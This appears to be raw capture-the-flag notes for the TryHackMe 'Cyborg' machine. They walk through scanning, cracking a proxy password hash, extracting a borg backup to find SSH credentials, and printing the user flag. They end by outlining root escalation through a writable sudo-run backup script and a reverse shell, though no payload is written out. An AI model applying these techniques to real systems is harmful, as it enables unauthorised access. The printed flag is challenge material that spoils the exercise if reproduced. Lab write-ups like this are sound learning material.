#### Raw Notes

> Date - 10/31/2023

1. RustScan --> Open ports --> 22, 80
2. Port 22 --> Need creds for login. Keep it for later.
3. Port 80 --> Default Apache Page. 
        --> Nikto Scan
        --> Dir Brute Force --> /admin --> admin.html --> Talks about `squid proxy`. --> http://www.squid-cache.org/
                                       --> archive.tar --> 
                            --> /etc/squid --> https://www.liquidweb.com/kb/install-squid-proxy-server-ubuntu-16-04/ --> tells us where the config file is hosted --> etc/squid/squid.conf
                                --> passwd --> cracked using hashcat to get a password
                                --> squid.conf

4. We find that `archive.tar` --> `/dev/final_Archive` is a borg backup dir --> https://www.borgbackup.org/
    --> We use following commands to extract some useful data --> `alex home dir` (backed up)
    ```bash
    $ ls
    archive.tar  home
                                                                                                                                    
    $ tree .               
    .
    ├── archive.tar
    └── home
        └── field
            └── dev
                └── final_archive
                    ├── config
                    ├── data
                    │   └── 0
                    │       ├── 1
                    │       ├── 3
                    │       ├── 4
                    │       └── 5
                    ├── hints.5
                    ├── index.5
                    ├── integrity.5
                    ├── nonce
                    └── README

    7 directories, 11 files
                                                                                                                                    
    $ borg info home/field/dev/final_archive
    Enter passphrase for key /home/kali/Desktop/Boxes/Try_Hack_Me/In Progress/Easy/Cyborg/web/Archive/home/field/dev/final_archive: 
    Repository ID: ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
    Location: /home/kali/Desktop/Boxes/Try_Hack_Me/In Progress/Easy/Cyborg/web/Archive/home/field/dev/final_archive
    Encrypted: Yes (repokey BLAKE2b)
    Cache: /home/kali/.cache/borg/ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
    Security dir: /home/kali/.config/borg/security/ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
    ------------------------------------------------------------------------------
                        Original size      Compressed size    Deduplicated size
    All archives:                1.49 MB              1.49 MB              1.50 MB

                        Unique chunks         Total chunks
    Chunk index:                      99                   99
                                                                                                                                    
    $ borg list home/field/dev/final_archive/
    Enter passphrase for key /home/kali/Desktop/Boxes/Try_Hack_Me/In Progress/Easy/Cyborg/web/Archive/home/field/dev/final_archive: 
    music_archive                        Tue, 2020-12-29 19:30:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
                                                                                                                                    
    $ borg extract home/field/dev/final_archive/::music_archive
    Enter passphrase for key /home/kali/Desktop/Boxes/Try_Hack_Me/In Progress/Easy/Cyborg/web/Archive/home/field/dev/final_archive: 
                                                                                                                                    
    $ tree .
    .
    ├── archive.tar
    └── home
        ├── alex
        │   ├── Desktop
        │   │   └── secret.txt
        │   ├── Documents
        │   │   └── note.txt
        │   ├── Downloads
        │   ├── Music
        │   ├── Pictures
        │   ├── Public
        │   ├── Templates
        │   └── Videos
        └── field
            └── dev
                └── final_archive
                    ├── config
                    ├── data
                    │   └── 0
                    │       ├── 1
                    │       ├── 3
                    │       ├── 4
                    │       └── 5
                    ├── hints.5
                    ├── index.5
                    ├── integrity.5
                    ├── nonce
                    └── README

    16 directories, 13 files
    ```

5. In `/home/alex/Documents` --> note.txt --> alex's creds --> SSH.
6. Logged in as alex --> `user.txt`

```bash
alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```
7. We find the following on sudo -l -->
```bash
alex@ubuntu:/etc/mp3backups$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

    alex@ubuntu:/etc/mp3backups$ ls -la
total 28
drwxr-xr-x   2 root root  4096 Dec 30  2020 .
drwxr-xr-x 133 root root 12288 Dec 31  2020 ..
-rw-r--r--   1 root root   339 Nov  5 03:15 backed_up_files.txt
-r-xr-xr--   1 alex alex  1097 Nov  5 03:12 backup.sh
-rw-r--r--   1 root root    45 Nov  5 03:15 ubuntu-scheduled.tgz
```

8. The file is owned by us so we can make many changes to get a root shell now
--> make it +w and add a simple bash command --> done
--> use the script to inject a command and run it --> shown
--> call out a reverse shell.
--> make a new backup.sh file 